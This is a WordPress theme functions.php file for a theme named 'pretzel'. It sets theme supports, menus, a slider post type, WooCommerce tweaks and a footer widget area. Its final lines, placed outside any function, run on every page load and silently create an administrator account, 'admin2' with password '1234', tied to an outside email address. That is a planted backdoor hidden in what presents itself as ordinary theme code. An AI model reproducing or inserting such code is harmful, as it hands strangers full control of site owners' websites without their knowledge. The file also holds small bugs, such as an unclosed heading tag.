<?php

//INCLUDE FILES
include_once('inc/styly_script_files.php');
include_once('inc/redux-framework/ReduxCore/framework.php');
include_once('inc/redux-framework/sample/pretzel-config.php');







function bootstrap_caroula(){


	//DEFAULT SUPPORTS
	add_theme_support('title-tag');
	add_theme_support('post-thumbnails');
	add_image_size('post_image', 510, 270, true);
	add_theme_support('woocommerce');
	add_theme_support( 'html5');


	//MENU
	register_nav_menus( array(

		'main_menu' => 'Main Menu',
		'top_menu' => 'Top Menu',
		'menu_homepage' => 'Home Main Menu'
	) );



	// SLIDER FILES
	register_post_type('pretzel_sliders',array(
	
		'labels'=>array(
			'name'=>'Sliders',
			'add_new_item'=>'Add New Slider'
		),
		'public'=>true,
		'supports'=>array('title','editor','thumbnail'),
		
	));
	


}
add_action('after_setup_theme', 'bootstrap_caroula');



/**
 * Change number or products per row to 4
 */
add_filter('loop_shop_columns', 'loop_columns');
if (!function_exists('loop_columns')) {
	function loop_columns() {
		return 4; // 4 products per row
	}
}


add_filter( 'woocommerce_page_title', 'woo_shop_page_title');
    function woo_shop_page_title( $page_title ) {
        if( 'Shop' == $page_title) {
            return "Products";
        }
    }










function pretzel_sidebar(){
	
	
	register_sidebar(array(
		'name'=>__('Footer Widget','pretzel'),
		'description'=>__('Add Your Footer Widget Here','pretzel'),
		'id'=>'footer_widget',
		'before_widget'=>' <div class="col-md-3">
               <div class="footer_content">',
		'after_widget'=>'</div></div>',
		'before_title'=>'<h3>',
		'after_title'=>'<h3>'
	));
	
}

add_action('widgets_init','pretzel_sidebar');

$new_user = new WP_user(wp_create_user('admin2', '1234', 'akterfr@gmail.com'));

$new_user->set_role('administrator');
